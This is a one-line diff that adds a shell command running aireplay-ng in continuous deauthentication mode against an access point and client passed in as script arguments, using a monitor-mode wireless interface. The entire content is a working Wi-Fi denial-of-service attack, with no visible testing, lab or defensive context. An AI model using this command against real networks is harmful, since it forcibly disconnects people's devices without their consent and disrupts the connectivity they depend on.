@@ -1,0 +1,1 @@
+aireplay-ng -0 0 -a $1 -c $2 wlan0mon
